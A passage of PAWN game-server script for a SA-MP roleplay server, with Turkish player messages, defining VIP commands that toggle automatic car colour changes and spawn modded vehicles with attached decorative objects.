				    SendClientMessage(playerid, 0xFF0000FF, "Görevdeyken bu komutu kullanamazsýnýz."); // "/rescue" doesn't work during a job
    				SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Görevi iptal etmek istiyorsanýz /goreviptal yazabilirsiniz");
				}
			}
			else
			{
			    SendClientMessage(playerid, 0xFF0000FF, "Hapisteyken bu komutu kullanamazsýnýz");
			}
		}
		else
		{
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Aranýyorken bu komutu kullanamazsýnýz");
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Eðer oyunda polis yoksa /karakol yazýp karakollardan birinde ceza ödeyin");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
new OtoRenkTimer[MAX_PLAYERS];

CMD:otorenkon(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/otorenkon", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
			// Check if the player is inside a vehicle
			if (IsPlayerInAnyVehicle(playerid))
			{
			    // Get the vehicleid
		   		OtoRenkTimer[playerid] = SetTimerEx("changeColor", 1000, true, "i", playerid);
    			playerChangeColor{playerid} = true;
				SendClientMessage(playerid, 0x00FF00FF, "Otomatik Renk Deðiþim Açýldý!");
			}
			else
				SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:otorenkoff(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/otorenkoff", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
			// Check if the player is inside a vehicle
			if (IsPlayerInAnyVehicle(playerid))
			{
			    // Get the vehicleid
				KillTimer(OtoRenkTimer[playerid]);
    			playerChangeColor{playerid} = false;
				SendClientMessage(playerid, 0x00FF00FF, "Otomatik Renk Deðiþim Kapandý!");
			}
			else
				SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}
CMD:m1(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m1", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
		if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
 		ivehicle[playerid] = Vehicle_Create(567,X,Y,Z,Angle,1,-1,9999); ChangeVehicleColor(ivehicle[playerid],3,209);

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1188,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1189,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1186,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][6] = CreateDynamicObject(1100,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][7] = CreateDynamicObject(1130,0.0,0.0,0.0,0.0,0.0,0.0);

		objecount[ivehicle[playerid]] = 9;

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], ivehicle[playerid], 0.899999,2.750001,-0.659999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], ivehicle[playerid], 0.879999,2.760000,-0.749999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], ivehicle[playerid], -0.899999,-2.830000,-0.629999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], ivehicle[playerid], -0.019999,-2.839999,-0.029999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], ivehicle[playerid], -0.019999,-2.839999,0.129999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], ivehicle[playerid], -0.019999,-2.859999,0.250000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], 0.000000,-0.010000,-0.379999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], ivehicle[playerid], 0.000000,0.299999,-0.240000,0.000000,0.000000,0.000000);

	    AVehicleData[vID][Fuel] = MaxFuel;
		AddVehicleComponent(ivehicle[playerid],1097); ChangeVehiclePaintjob(ivehicle[playerid],2);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
			}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m2(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m2", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
  	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
  	if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
    new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);

    ivehicle[playerid] = Vehicle_Create(560,X,Y,Z,Angle,1,-1,9999); ChangeVehicleColor(ivehicle[playerid],3,0);
	objecount[ivehicle[playerid]] = 10;


	ob[ivehicle[playerid]][0] = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterialText(ob[ivehicle[playerid]][0], 0, "TM", 130, "Ariel", 60, 0, -1, 0, 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], ivehicle[playerid], -0.360, 1.310, 0.178, -54.500, 0.000, 175.799);

	ob[ivehicle[playerid]][1] =  CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterialText(ob[ivehicle[playerid]][1], 0, "Canakkale Meslek", 130, "Ariel", 40, 0, -1, 0, 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], ivehicle[playerid], -0.659, 1.246, 0.114, -51.699, 0.000, -179.099);

	ob[ivehicle[playerid]][2] = CreateDynamicObject(11737,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterial(ob[ivehicle[playerid]][2], 0, 18646, "matcolours", "red-4", 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], ivehicle[playerid], 0.000, -1.339, 0.451, 29.100, 0.000, 0.000);

	ob[ivehicle[playerid]][3] = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterialText(ob[ivehicle[playerid]][3], 0, "Z", 130, "Wingdings", 60, 0, -1, 0, 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], ivehicle[playerid], 1.000, -1.616, 0.278, -53.399, 0.000, 0.000);


	ob[ivehicle[playerid]][4] =  CreateDynamicObject(18647,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], ivehicle[playerid], -0.699, 0.000, -0.430, 0.000, 0.000, 0.000);


	ob[ivehicle[playerid]][5] = CreateDynamicObject(18647,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], ivehicle[playerid], 0.970, 0.000, -0.430, 0.000, 0.000, 0.000);

	/*ob[ivehicle[playerid]][6] = CreateDynamicObject(1023,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], 0.000, -2.280, 0.339, 0.000, 0.000, 0.000);*/

	ob[ivehicle[playerid]][6] =  CreateDynamicObject(1142,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], -0.210, 0.170, 0.770, 0.000, 0.000, 0.000);

	ob[ivehicle[playerid]][7] = CreateDynamicObject(1142,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], ivehicle[playerid], 0.190, 0.160, 0.770, 0.000, 0.000, 0.000);

	ob[ivehicle[playerid]][8] =  CreateDynamicObject(2233,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterial(ob[ivehicle[playerid]][8], 0, 10101, "2notherbuildsfe", "Bow_Abpave_Gen", 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][8], ivehicle[playerid], -0.300, -1.815, -0.367, -57.299, 0.000, 0.000);

	ob[ivehicle[playerid]][9] = CreateDynamicObject(2233,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
	SetDynamicObjectMaterial(ob[ivehicle[playerid]][9], 0, 10101, "2notherbuildsfe", "Bow_Abpave_Gen", 0);
	AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][9], ivehicle[playerid], 1.020, -1.751, -0.383, -55.099, 0.000, 0.000);

    ChangeVehiclePaintjob(ivehicle[playerid], 1);
    AddVehicleComponent(ivehicle[playerid], 1169);
    AddVehicleComponent(ivehicle[playerid], 1141);
    AddVehicleComponent(ivehicle[playerid], 1028);
    AddVehicleComponent(ivehicle[playerid], 1138);
	SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
	Araba[playerid] = 1;
	AVehicleData[vID][Fuel] = MaxFuel;
	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m3(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m3", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
    	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
    	if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        ivehicle[playerid] = Vehicle_Create(603,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

		objecount[ivehicle[playerid]] = 7;

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1171,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1167,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1037,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1163,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(1027,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1027,0.0,0.0,0.0,0.0,0.0,0.0);
		//ob[ivehicle[playerid]][6] = CreateDynamicObject(1027,0,0,-1000,0,0,0,-1);

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], ivehicle[playerid], -1.039999,2.149999,-0.270000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], ivehicle[playerid], -1.059999,-1.970000,-0.179999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], ivehicle[playerid], 0.000000,-0.500001,-0.129999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], ivehicle[playerid], 0.000000,-2.599999,0.300000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], ivehicle[playerid], 1.009999,-0.930002,-0.679999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], ivehicle[playerid], -1.040000,0.939998,-0.649999,0.000000,0.099999,-180.000000);
		//AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], -1.049999,-0.974999,-0.449999,0.000000,0.000000,0.000000);

		//AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
  	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m4(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m4", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{

        ObjeBugCoz(playerid);

		if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
        if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        ivehicle[playerid] = Vehicle_Create(589,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

        objecount[ivehicle[playerid]] = 6;

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1155,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1168,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1034,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1147,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(1024,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1254,0.0,0.0,0.0,0.0,0.0,0.0);
		/*ob[ivehicle[playerid]][6] = CreateDynamicObject(1005,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][7] = CreateDynamicObject(1003,0,0,-1000,0,0,0,-1);*/

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], GetPlayerVehicleID(playerid), -1.069999,1.740000,-0.039999,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], GetPlayerVehicleID(playerid), -1.039999,-1.630000,0.000000,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], GetPlayerVehicleID(playerid), 0.000000,-0.139999,0.089999,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], GetPlayerVehicleID(playerid), 0.000000,-2.070002,1.069999,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], GetPlayerVehicleID(playerid), -0.009999,2.480001,-0.190000,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], GetPlayerVehicleID(playerid), 0.000000,2.480000,-0.250000,0.000000,0.000000,0.000000);
        /*AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], GetPlayerVehicleID(playerid), -0.000000,-0.225000,0.749999,0.000000,0.000000,0.000000);
        AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], GetPlayerVehicleID(playerid), -0.000000,-2.550000,0.240000,0.000000,0.000000,0.000000);*/

		AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
   	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m5 (playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m5", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		ObjeBugCoz(playerid);

     	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
        if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
		 ivehicle[playerid] = Vehicle_Create(579,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

        objecount[ivehicle[playerid]] = 7;

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1166,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1168,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1126,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1147,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(19797,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(19797,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][6] = CreateDynamicObject(1100,0.0,0.0,0.0,0.0,0.0,0.0);

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], GetPlayerVehicleID(playerid), 1.029999,1.710000,-0.210000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], GetPlayerVehicleID(playerid), -1.069999,-2.029999,-0.179999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], GetPlayerVehicleID(playerid), 0.000000,-0.019999,0.000000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], GetPlayerVehicleID(playerid), 0.000000,-2.409999,1.249999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], GetPlayerVehicleID(playerid), 0.879999,2.360001,0.159999,0.000000,0.000000,-189.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], GetPlayerVehicleID(playerid), -0.869999,2.360001,0.159999,0.000000,0.000000,-172.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], GetPlayerVehicleID(playerid), -0.029999,-0.499999,-0.220000,0.000000,0.000000,0.000000);

		//AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
   	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m6(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m6", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		

		ObjeBugCoz(playerid);

		if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
        if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        ivehicle[playerid] = Vehicle_Create(549,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

        objecount[ivehicle[playerid]] = 7;

  		ob[ivehicle[playerid]][0] = CreateDynamicObject(1171,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1003,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(1168,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1018,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][6] = CreateDynamicObject(1018,0.0,0.0,0.0,0.0,0.0,0.0);
		//ob[ivehicle[playerid]][7] = CreateDynamicObject(1005,0,0,-1000,0,0,0,-1);

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], GetPlayerVehicleID(playerid), -1.029999,1.930000,-0.180000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], GetPlayerVehicleID(playerid), 0.000000,-2.339999,0.129999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], GetPlayerVehicleID(playerid), 0.000000,-2.349999,0.270000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], GetPlayerVehicleID(playerid), 0.000000,-2.329999,0.389999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], GetPlayerVehicleID(playerid), -1.069999,-1.880000,-0.119999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], GetPlayerVehicleID(playerid), 0.479999,-1.770000,-0.479999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], GetPlayerVehicleID(playerid), -0.499999,-1.770000,-0.479999,0.000000,0.000000,0.000000);
        //AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][7], GetPlayerVehicleID(playerid), -0.020000,-0.190000,0.644999,0.000000,0.000000,0.000000);

		AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
   	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
} 	

CMD:m7(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m7", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{

        ObjeBugCoz(playerid);

    	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
    	if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
 ivehicle[playerid] = Vehicle_Create(587,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

		objecount[ivehicle[playerid]] = 7;

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1171,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1159,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1163,0.0,0.0,0.0,0.0,0.0,0.0);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1066,0.0,0.0,0.0,0.0,0.0,0.0);
		/*ob[ivehicle[playerid]][4] = CreateDynamicObject(1166,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1026,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][6] = CreateDynamicObject(1027,0,0,-1000,0,0,0,-1);*/

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], ivehicle[playerid], -1.039999,1.630000,-0.200000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][1], ivehicle[playerid], 1.069999,-2.089999,-0.189999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][2], ivehicle[playerid], -0.009999,-2.579998,0.469999,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][3], ivehicle[playerid], -0.009999,-0.580001,-0.139999,0.000000,0.000000,0.000000);
		/*AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][4], ivehicle[playerid], 1.049999,1.575000,0.000000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][5], ivehicle[playerid], 1.049999,-0.899999,-0.375000,0.000000,0.000000,0.000000);
		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][6], ivehicle[playerid], -1.049999,-0.974999,-0.449999,0.000000,0.000000,0.000000);*/

		//AddVehicleComponent(ivehicle[playerid], 1079);
		SetVehicleVirtualWorld(ivehicle[playerid], GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(ivehicle[playerid], GetPlayerInterior(playerid));PutPlayerInVehicle(playerid,ivehicle[playerid],0);
        Araba[playerid] = 1;
        AVehicleData[vID][Fuel] = MaxFuel;
    	}
 		else
			SendClientMessage(playerid, 0x00FF00FF, "Aracta Olmalýsýn.");
		}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:m8(playerid, params[])
{
	// Setup local variables

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/m8", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (VIP[playerid] >= 1 || YVIP[playerid] == 1)
		{
		

		ObjeBugCoz(playerid);

    	if(IsPlayerInAnyVehicle(playerid))RemovePlayerFromVehicle(playerid);
        if(Araba[playerid] == 1)  DestroyVehicleEx(ivehicle[playerid]), Araba[playerid] = 0;
        new vID,Float:X,Float:Y,Float:Z,Float:Angle; GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        ivehicle[playerid] = Vehicle_Create(602,X,Y,Z,Angle,1,-1,9999);ChangeVehicleColor(ivehicle[playerid],0,0);

        objecount[ivehicle[playerid]] = 7;

		ob[ivehicle[playerid]][0] = CreateDynamicObject(1003,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][1] = CreateDynamicObject(1003,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][2] = CreateDynamicObject(1003,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][3] = CreateDynamicObject(1005,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][4] = CreateDynamicObject(1093,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][5] = CreateDynamicObject(1094,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][6] = CreateDynamicObject(1171,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][7] = CreateDynamicObject(1150,0,0,-1000,0,0,0,-1);
		ob[ivehicle[playerid]][8] = CreateDynamicObject(1150,0,0,-1000,0,0,0,-1);

		AttachDynamicObjectToVehicle(ob[ivehicle[playerid]][0], GetPlayerVehicleID(playerid), 0.004999,-2.475000,0.179999,0.000000,0.000000,0.000000);
